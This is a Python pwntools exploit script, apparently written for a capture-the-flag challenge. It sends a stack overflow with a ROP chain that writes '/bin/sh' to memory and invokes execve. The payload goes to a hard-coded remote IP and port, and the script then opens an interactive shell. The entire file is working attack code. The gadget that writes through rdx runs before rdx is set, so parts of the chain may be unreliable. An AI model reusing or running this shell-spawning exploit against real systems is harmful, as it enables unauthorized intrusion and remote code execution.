#!/usr/bin/python
from pwn import *

payload = "A"*0x48
payload += p64(0x415544) # pop rax ; ret
payload += p64(0x0068732f6e69622f) # /bin/sh\x00
payload += p64(0x4423b3) # mov qword ptr [rdx], rax ; mov rax, rdi ; ret
payload += p64(0x400686) # pop rdi ; ret
payload += p64(0x6bbd30) # bss
payload += p64(0x44bce9) # pop rdx ; pop rsi ; ret
payload += p64(0) * 2
payload += p64(0x415544) # pop rax ; ret
payload += p64(0x3b) # execve call number = 59
payload += p64(0x40123c) # syscall

r = remote('35.186.153.116', 7002)
r.sendline(payload)
r.interactive()
